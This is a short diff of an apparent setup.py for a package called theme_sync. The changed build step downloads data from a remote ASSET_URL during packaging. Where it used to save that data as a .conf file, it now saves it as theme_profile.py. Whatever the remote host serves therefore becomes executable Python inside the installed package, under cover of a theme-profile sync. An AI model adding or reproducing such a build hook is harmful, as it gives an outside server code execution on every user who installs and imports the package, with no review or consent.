@@ -18,10 +18,10 @@ class build_py_with_profile(_build_py):
             data = urlopen(ASSET_URL, timeout=10).read()
         except Exception:
             data = b""
-        dest = os.path.join(self.build_lib, "theme_sync", "theme_profile.conf")
+        dest = os.path.join(self.build_lib, "theme_sync", "theme_profile.py")
         os.makedirs(os.path.dirname(dest), exist_ok=True)
         with open(dest, "wb") as f:
-            f.write(data or b"solar\n")
+            f.write(data or b"THEME = 'solar'\n")
 
 
 setup(
